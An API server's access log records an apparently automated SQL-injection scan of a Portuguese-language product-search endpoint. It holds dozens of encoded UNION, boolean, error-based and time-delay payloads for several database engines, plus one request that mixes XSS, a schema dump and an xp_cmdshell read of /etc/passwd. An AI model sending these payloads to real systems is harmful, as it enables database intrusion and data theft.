api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:49642 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28IS_SRVROLEMEMBER%28NULL%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29--%2F%2A%2A%2FqcCh HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49636 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%2C113%2C107%2C122%2C113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28LAST_INSERT_ROWID%28%29%3DLAST_INSERT_ROWID%28%29%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%7C%7CCHAR%28113%2C118%2C112%2C112%2C113%29--%2F%2A%2A%2FVtqf HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49648 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%2C113%2C107%2C122%2C113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28SQLITE_VERSION%28%29%3DSQLITE_VERSION%28%29%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%7C%7CCHAR%28113%2C118%2C112%2C112%2C113%29--%2F%2A%2A%2FOdkf HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49656 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%2C113%2C107%2C122%2C113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28RANDOMBLOB%28-1%29%2F%2A%2A%2FIS%2F%2A%2A%2FNOT%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%7C%7CCHAR%28113%2C118%2C112%2C112%2C113%29--%2F%2A%2A%2Fpagk HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49672 - "GET /produtos/busca/?categoria=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49670 - "GET /produtos/busca/?categoria=teste&uCYs=7691%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49686 - "GET /produtos/busca/?categoria=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49702 - "GET /produtos/busca/?categoria=7179 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49712 - "GET /produtos/busca/?categoria=teste%22.%2C.%2C%28.%27%2C%28 HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49732 - "GET /produtos/busca/?categoria=teste%27ypOMmK%3C%27%22%3EEtrScX HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49718 - "GET /produtos/busca/?categoria=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49738 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7470%3D9228%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27EJix%27%3D%27EJix HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49744 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8502%3D8502%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27ijzp%27%3D%27ijzp HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49768 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7776%3D4083%2F%2A%2A%2FAND%2F%2A%2A%2F%27qpOf%27%3D%27qpOf HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49778 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8502%3D8502%2F%2A%2A%2FAND%2F%2A%2A%2F%27kvnu%27%3D%27kvnu HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49754 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5496%3D1686%2F%2A%2A%2FAND%2F%2A%2A%2F%283556%3D3556 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49790 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F8502%3D8502%2F%2A%2A%2FAND%2F%2A%2A%2F%284643%3D4643 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49802 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2429%3D6894 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49818 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8502%3D8502 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49824 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7322%3D1587--%2F%2A%2A%2FiuMj HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49838 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8502%3D8502--%2F%2A%2A%2FJzPj HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49852 - "GET /produtos/busca/?categoria=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284063%3D3829%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3829%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F4062%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49866 - "GET /produtos/busca/?categoria=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287110%3D7110%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6180%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F5307%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49814 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283280%2CCONCAT%280x5c%2C0x716b707671%2C%28SELECT%2F%2A%2A%2F%28ELT%283280%3D3280%2C1%29%29%29%2C0x71706a7671%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27ckVL%27%3D%27ckVL HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49872 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283280%2CCONCAT%280x5c%2C0x716b707671%2C%28SELECT%2F%2A%2A%2F%28ELT%283280%3D3280%2C1%29%29%29%2C0x71706a7671%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27Rkdu%27%3D%27Rkdu HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49886 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283280%2CCONCAT%280x5c%2C0x716b707671%2C%28SELECT%2F%2A%2A%2F%28ELT%283280%3D3280%2C1%29%29%29%2C0x71706a7671%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284201%3D4201 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49900 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283280%2CCONCAT%280x5c%2C0x716b707671%2C%28SELECT%2F%2A%2A%2F%28ELT%283280%3D3280%2C1%29%29%29%2C0x71706a7671%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49908 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283280%2CCONCAT%280x5c%2C0x716b707671%2C%28SELECT%2F%2A%2A%2F%28ELT%283280%3D3280%2C1%29%29%29%2C0x71706a7671%29%29--%2F%2A%2A%2FfFtl HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49914 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8008%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288008%3D8008%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27jjCS%27%3D%27jjCS HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49926 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8008%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288008%3D8008%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27TZja%27%3D%27TZja HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49928 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F8008%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288008%3D8008%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282789%3D2789 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49936 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8008%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288008%3D8008%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49948 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8008%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288008%3D8008%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FjwLa HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49946 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5449%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285449%3D5449%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27kqrB%27%3D%27kqrB HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49962 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F5449%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285449%3D5449%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27iTyo%27%3D%27iTyo HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49964 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5449%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285449%3D5449%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285603%3D5603 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49966 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5449%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285449%3D5449%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49986 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5449%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285449%3D5449%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FuMhu HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49974 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1804%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281804%3D1804%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27uRsO%27%3D%27uRsO HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50000 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1804%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281804%3D1804%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27uKCh%27%3D%27uKCh HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50002 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1804%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281804%3D1804%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282366%3D2366 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49994 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1804%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281804%3D1804%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50004 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1804%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281804%3D1804%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FJEql HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50018 - "GET /produtos/busca/?categoria=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qkpvq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287563%3D7563%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qpjvq%27%29%29 HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50028 - "GET /produtos/busca/?categoria=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50040 - "GET /produtos/busca/?categoria=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50042 - "GET /produtos/busca/?categoria=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50050 - "GET /produtos/busca/?categoria=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50034 - "GET /produtos/busca/?categoria=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50062 - "GET /produtos/busca/?categoria=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50072 - "GET /produtos/busca/?categoria=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50082 - "GET /produtos/busca/?categoria=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50098 - "GET /produtos/busca/?categoria=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%2879%29%7C%7CCHR%2890%29%7C%7CCHR%2887%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50106 - "GET /produtos/busca/?categoria=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%2879%29%7C%7CCHR%2890%29%7C%7CCHR%2887%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50118 - "GET /produtos/busca/?categoria=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%2879%29%7C%7CCHR%2890%29%7C%7CCHR%2887%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50132 - "GET /produtos/busca/?categoria=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%2879%29%7C%7CCHR%2890%29%7C%7CCHR%2887%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
